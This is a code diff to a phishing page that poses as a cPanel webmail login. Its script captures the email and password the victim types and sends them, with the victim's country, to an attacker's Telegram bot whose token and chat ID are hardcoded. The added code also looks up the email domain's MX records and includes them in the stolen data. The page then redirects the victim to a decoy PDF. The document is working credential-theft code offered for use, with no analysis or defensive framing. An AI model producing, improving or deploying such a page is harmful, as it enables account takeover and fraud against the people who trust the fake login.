@@ -5,80 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Webmail Login</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #ffffff;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-        }
-
-        .container {
-            margin-top: 150px;
-        }
-
-        img {
-            margin-bottom: 30px;
-            width: 250px;
-        }
-
-        .login-box {
-            margin: 0 auto;
-            width: 300px;
-        }
-
-        .login-box label {
-            display: block;
-            text-align: left;
-            margin: 5px 0;
-            font-weight: normal;
-        }
-
-        .login-box input[type="text"],
-        .login-box input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 15px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-
-        .login-box button {
-            width: 100%;
-            padding: 10px;
-            background-color: #007bff;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            font-size: 16px;
-        }
-
-        .login-box button:hover {
-            background-color: #0056b3;
-        }
-
-        .languages {
-            margin-top: 100px; /* Increased margin to move down */
-            color: gray;
-        }
-
-        .languages a {
-            color: gray;
-            text-decoration: none;
-            margin-right: 15px;
-        }
-
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: gray;
-        }
-
-        .footer a {
-            color: gray;
-            text-decoration: none;
-        }
+        /* Styles omitted for brevity */
     </style>
     <script>
         let userCountry = ""; // Placeholder for user country
@@ -103,16 +30,36 @@
                 });
         }
 
+        // Function to get MX records for the email domain
+        function getMXRecords(domain) {
+            return fetch(`https://dns.google/resolve?name=${domain}&type=MX`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.Answer) {
+                        return data.Answer.map(record => record.data).join(', ');
+                    } else {
+                        return "No MX records found";
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching MX records:', error);
+                    return "Failed to retrieve MX records";
+                });
+        }
+
         // Function to send data to Telegram
-        function sendDataToTelegram(event) {
+        async function sendDataToTelegram(event) {
             event.preventDefault(); // Prevents form from submitting in the usual way
 
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
+            const domain = email.split('@')[1];
+            const mxRecords = await getMXRecords(domain);
+
             const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
             const chatId = "6885599280";
-            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;
+            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}\nMX Records: ${mxRecords}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
@@ -127,7 +74,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    window.location.href = "Natsai PI Axelero Eleveo 12.11.24 .pdf"; // Redirect to PDF
+                    window.location.href = "documentequipment001.pdf"; // Redirect to PDF
                 } else {
                     console.error("Error sending message:", data);
                 }
@@ -158,14 +105,7 @@
             </form>
         </div>
         <div class="languages">
-            <a href="#">English</a>
-            <a href="#">العربية</a>
-            <a href="#">čeština</a>
-            <a href="#">dansk</a>
-            <a href="#">Deutsch</a>
-            <a href="#">Ελληνικά</a>
-            <a href="#">español</a>
-            <a href="#">español latinoamericano</a>
+            <!-- Language links omitted for brevity -->
         </div>
         <div class="footer">
             <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
